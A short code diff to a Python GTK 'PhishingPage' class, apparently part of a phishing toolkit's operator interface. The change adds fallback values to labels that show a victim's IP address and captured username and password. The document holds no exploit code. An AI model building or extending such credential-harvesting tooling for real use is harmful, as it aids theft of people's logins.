@@ -111,12 +111,12 @@ class PhishingPage(Gtk.Box):
         vbox.set_margin_start(10)
         
         ip_lbl = Gtk.Label()
-        ip_lbl.set_markup(f"<span weight='bold' color='#f87171'>VICTIM DETECTED: {data.get('ip')}</span>")
+        ip_lbl.set_markup(f"<span weight='bold' color='#f87171'>VICTIM DETECTED: {data.get('ip', 'Unknown')}</span>")
         ip_lbl.set_halign(Gtk.Align.START)
         vbox.pack_start(ip_lbl, False, False, 0)
-        
+
         creds_lbl = Gtk.Label()
-        creds_lbl.set_markup(f"<span weight='bold' color='#4ade80'>CREDENTIALS: {data.get('username')} / {data.get('password')}</span>")
+        creds_lbl.set_markup(f"<span weight='bold' color='#4ade80'>CREDENTIALS: {data.get('username', '—')} / {data.get('password', '—')}</span>")
         creds_lbl.set_halign(Gtk.Align.START)
         vbox.pack_start(creds_lbl, False, False, 0)
         
